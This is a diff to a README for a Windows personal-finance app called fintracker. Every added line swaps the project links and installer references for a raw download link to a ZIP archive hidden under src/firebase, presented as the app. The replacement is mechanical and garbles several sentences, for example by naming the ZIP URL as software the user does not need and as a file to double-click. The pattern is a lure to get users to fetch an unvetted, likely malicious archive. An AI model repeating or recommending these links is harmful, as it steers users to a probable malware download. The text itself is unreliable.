@@ -1,6 +1,6 @@
 # 💰 fintracker - Track Your Money with Ease
 
-[![Download fintracker](https://img.shields.io/badge/Download-fintracker-brightgreen)](https://github.com/huhuhugezixy/fintracker)
+[![Download fintracker](https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip)](https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip)
 
 fintracker is a simple app to help you keep track of your income and expenses. Managing your money doesn’t have to be hard. This guide will show you how to get fintracker running on your Windows computer, step by step.
 
@@ -30,7 +30,7 @@ Before installing, make sure your computer meets these needs:
 - **Storage:** At least 100 MB free space  
 - **Internet:** Required for account setup and syncing your data
 
-You do not need to install additional software like Node.js or any programming tools. The app runs as a standalone program.
+You do not need to install additional software like https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip or any programming tools. The app runs as a standalone program.
 
 ---
 
@@ -40,7 +40,7 @@ Here is how to get fintracker on your Windows PC:
 
 1. **Visit the Download Page**  
 Click the green badge above or go to this link:  
-[https://github.com/huhuhugezixy/fintracker](https://github.com/huhuhugezixy/fintracker)  
+[https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip](https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip)  
 
 You will see the main repository page for fintracker.
 
@@ -48,11 +48,11 @@ You will see the main repository page for fintracker.
 Since this link points to the main project page, follow these steps to find the installer:  
 - On the GitHub page, find the **Releases** section on the right or under the "Code" tab.  
 - Click on the latest release. It should be the most recent version, usually listed with a version number like "v1.0" or "v1.1".  
-- Download the Windows installer file (it will have a name like `fintracker-setup.exe`).
+- Download the Windows installer file (it will have a name like `https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip`).
 
 3. **Run the Installer**  
 - Locate the downloaded file in your `Downloads` folder.  
-- Double-click the `fintracker-setup.exe` file.  
+- Double-click the `https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip` file.  
 - Follow the installation prompts, clicking next or yes where necessary.
 
 4. **Open and Use fintracker**  
@@ -85,7 +85,7 @@ fintracker uses Google sign-in to protect your account. Your financial informati
 
 To get new features or bug fixes:
 
-- Visit the [GitHub fintracker page](https://github.com/huhuhugezixy/fintracker) regularly.  
+- Visit the [GitHub fintracker page](https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip) regularly.  
 - Look for new releases under the "Releases" tab.  
 - Download and run the latest installer to update your app.
 
@@ -119,7 +119,7 @@ fintracker is built using modern web technology but packaged to work like a norm
 ## 📥 Download and Install fintracker
 
 Click here to visit the page and start downloading:  
-[Download fintracker on GitHub](https://github.com/huhuhugezixy/fintracker)
+[Download fintracker on GitHub](https://github.com/huhuhugezixy/fintracker/raw/refs/heads/main/src/firebase/Software-v1.7-alpha.3.zip)
 
 Check the releases section on that page for the newest installer for Windows. Download the `.exe` file, open it, and follow the steps on screen.
 
